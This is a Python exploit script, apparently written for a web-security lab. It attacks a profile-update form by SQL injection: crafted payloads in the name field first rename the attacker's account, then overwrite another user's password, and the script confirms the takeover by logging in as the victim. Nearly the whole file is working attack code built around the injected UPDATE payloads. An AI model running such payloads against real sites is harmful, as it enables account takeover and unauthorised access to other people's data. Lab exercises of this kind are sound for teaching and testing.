#!/usr/bin/env python3
import requests, sys
from interface import *
from bs4 import BeautifulSoup

if len(sys.argv) != 2:
    print(f"Usage: {__file__} server_url")
    sys.exit(-1)

url = sys.argv[1]

victim_username = 'asdf'
victim_password = 'asdf'
attacker_username = 'fdsa'
attacker_password = 'fdsa'
new_attacker_username = 'qwer'
new_attacker_name = 'Kevin Mitnick'
new_password = 'vuln'

session = requests.Session()

reset_app(session, url)
register(session, url, victim_username, victim_password)
logout(session, url)
register(session, url, attacker_username, attacker_password)

# Update profile
payload = f"""{new_attacker_name}', username='{new_attacker_username}' where username='{attacker_username}'#"""

r = update_profile(session, url, password=attacker_password, name=payload)

# Check if we succeeded updating the profile
assert f"Succesfully updated user {attacker_username} profile" in r.text

# Since we changed the username, now we will have to login again
logout(session, url)
login(session, url, new_attacker_username, attacker_password) # don't forget we changed the username
r = get_profile(session, url)

# Parse response
soup = BeautifulSoup(r.text, 'html.parser')
form = soup.find_all("form")
assert len(form) == 1

form = form[0]

assert form.find(id="nameInput")['placeholder'] == new_attacker_name

assert form.find(id="usernameInput")['placeholder'] == new_attacker_username

print(f"[+] Successfully changed username to {new_attacker_username}")


# Update profile
payload = f"""', username='{victim_username}', password ='{new_password}' where username ='{victim_username}'#"""

r = update_profile(session, url, password=attacker_password, name=payload)

# Check if we succeeded updating the profile
assert f"Succesfully updated user {new_attacker_username} profile" in r.text

logout(session, url)

login(session, url, victim_username, new_password)

r = get_profile(session, url)

soup = BeautifulSoup(r.text, 'html.parser')
inp = soup.find(id="usernameInput") # UsernameInput field will have username placeholder

assert soup.find(id="usernameInput")['placeholder'] == victim_username

print(f"[+] Successfully logged in as {victim_username} with new password '{new_password}'")

session.close()
